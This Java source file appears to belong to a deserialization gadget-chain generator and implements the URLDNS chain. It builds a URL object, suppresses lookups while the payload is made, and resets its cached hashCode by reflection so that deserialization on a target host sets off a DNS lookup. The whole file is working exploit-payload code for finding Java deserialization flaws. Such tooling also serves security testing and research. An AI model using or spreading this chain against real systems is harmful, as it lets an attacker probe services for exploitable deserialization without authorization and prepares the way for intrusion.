package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;

@Dependencies()
@Authors({ Authors.GEBL })
@Impact(Impact.DNSLookup)
public class URLDNS extends GadgetChain<HashCodeTrampoline> {

    URL url;

    public URLDNS(HashCodeTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();
        this.url = new URL(null, command, handler);

        return new TrampolineConnector(url);
    }

    @Override
    protected void postProcessPayload() throws Exception {
        Reflections.setFieldValue(url, "hashCode", -1);
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    @Override
    protected String getStackTrace() {
        return "java.net.URL.hashCode()\n" +
                "java.net.URLStreamHandler.hashCode(URL)\n" +
                "java.net.URLStreamHandler.getHostAddress()\n" +
                "java.net.URL.getHostAddress()\n" +
                "java.net.InetAddress.getByName()";
    }
}
